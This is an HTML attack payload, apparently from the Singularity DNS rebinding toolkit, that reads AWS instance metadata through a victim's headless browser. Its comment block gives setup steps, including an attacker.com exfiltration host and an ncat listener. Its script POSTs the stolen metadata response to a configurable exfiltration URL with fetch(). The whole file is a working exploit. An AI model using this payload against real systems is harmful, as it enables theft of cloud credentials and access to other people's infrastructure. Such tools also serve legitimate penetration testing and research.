<!--
This is a sample payload to make a GET request to a AWS metadata endpoint and exfiltrate the response.
This is a useful in the context of a service wrapping a headless browser such as Google Chrome and when
the output of the browser is not shown to the attacker.

Replace `EXFILTRATION_URL` with the host and path to exfiltrate data e.g. http://attacker.com:8000/
Change `begin('/latest/meta-data/')` as appropriate to exfiltrate the desired data e.g. `/latest/meta-data/`...

Run a tool such as `ncat` e.g. `ncat -lkv 8000` on the attacker host to capture the exfiltrated data.
Use TLS if you want to protect the exfiltrated data in transit.

Run the Singularity server e.g
`./singularity-server -HTTPServerPort 80`

-->
<!doctype html>
<html>

<head>
    <title>payload-aws-metadata</title>
    <script src="payload.js"></script>
    <script>
        // attack() is called once DNS rebinding is successful
        // headers and body contains server data obtained 
        // from the victim service during rebinding, if any.
        function attack(headers, cookie, body) {
            if (headers !== null) {
                console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
            };
            if (cookie !== null) {
                console.log(`Origin: ${window.location} headers: ${cookie}`);
            };
            if (body !== null) {
                console.log(`Origin: ${window.location} body:\n${body}`);
            };

            let EXFILTRATION_URL = "http://xxxx.xxx:xxxxx/";
            fetch(EXFILTRATION_URL, {
                method: 'POST',
                mode: "no-cors",
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                },
                body: body
            });
        }
    </script>
</head>
<body onload="begin('/latest/meta-data/')">
    <h3>AWS Metadata Exfiltration Payload</h3>
    <p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
</body>
</html>